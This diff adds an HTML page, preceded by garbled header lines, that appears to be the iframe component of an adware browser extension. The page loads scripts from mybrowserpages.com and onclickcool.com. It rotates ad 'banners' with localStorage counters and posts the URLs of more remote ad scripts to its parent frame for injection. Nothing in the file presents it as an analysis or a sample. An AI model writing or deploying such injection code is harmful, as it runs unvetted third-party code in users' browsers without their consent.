@@ -1,0 +1,96 @@
+-By Muhammad Adi Nugroho, S.Adm.Neg.:
+-Resources:
+or987(nszj):
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+</head>
+<body>
+<script src="https://mybrowserpages.com/extension/EasySearch/info.js"></script>
+<script src="https://www.onclickcool.com/8v8gcm/bindo.js"></script>
+<script type="text/javascript">
+	function GetZeroStamp()
+	{
+	    var date = new Date();
+		return date.getTime() - date.getHours()*3600000 - date.getMinutes() * 60000 -
+			date.getSeconds() * 1000 - date.getMilliseconds();
+	}
+	var rootUrl = document.location.hash.substr(1);
+	var resettimes = 1;
+	var config = {
+			banner:{
+				types:[0,1,2,3],
+				maxtimes:[6,2,3,2],
+				showed:[0,0,0,0]
+			},
+            domainname:0,
+			resettimes:0,
+			timestamp:0
+	};
+	window.addEventListener('message',function(e){
+		if(e.source != window.parent)
+			return;
+		var data = JSON.parse(localStorage.getItem("acontrol")) || config;
+		var lcresettimes = data.hasOwnProperty("resettimes") ?  data["resettimes"] : 0;
+        if ((GetZeroStamp() - data.timestamp >= 3600000 * 24) || resettimes > lcresettimes) {
+            data = config;
+			data.resettimes = resettimes;
+            data.domainname = Math.floor(Math.random()*4);
+            console.log(data.domainname);
+		}
+		var bn_should_show = 0;
+		//banner
+		var bn_showed = 0;
+		var bn_all_showed = true;
+		var banner_data = data.banner;
+		for(var i = 0; i < banner_data.types.length; i ++)
+		{
+			var atype = banner_data.types[i];
+			var maxtimes = banner_data.maxtimes[atype];
+			bn_showed = banner_data.showed[atype];
+			if (bn_showed < maxtimes) {
+				bn_all_showed = false;
+				bn_should_show = atype;
+				banner_data.showed[atype] = bn_showed + 1;
+				break;
+			}
+		}
+		if (bn_all_showed) {
+			data.banner = config.banner;
+		}
+		
+		//code
+		var banner_code = "";
+		var bn_code_pos = 1;
+		switch (bn_should_show) {
+            case 1:
+                banner_code = ('https:' == document.location.protocol ? 'https://' : 'http://')+'mybrowserpages.com/extension/web_ads_ifrome_js/content_google.js';
+                break;
+            case 2:
+                banner_code = 'https://www.onclickcool.com/8v8gcm/bindo.js';
+                break;
+            case 3:
+                banner_code = ('https:' == document.location.protocol ? 'https://' : 'http://')+'mybrowserpages.com/extension/web_ads_ifrome_js/content_mygame.js';
+                break;
+			default:
+				banner_code = ('https:' == document.location.protocol ? 'https://' : 'http://')+'mybrowserpages.com/extension/web_ads_ifrome_js/content_Ad4game.js';
+				bn_code_pos = 0;
+				break;
+		}
+        var bn_show_domain = data.domainname;
+		data.timestamp = GetZeroStamp();
+		localStorage.setItem("acontrol", JSON.stringify(data));
+		var postData = {
+			bn:{
+				code: banner_code,
+				pos: bn_code_pos,
+                domain: bn_show_domain
+			}
+		};
+		window.parent.postMessage(postData,rootUrl);
+    },false);
+</script>
+<img src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/y1/r/LVx-xkvaJ0b.png"></img>
+</body>
+</html>
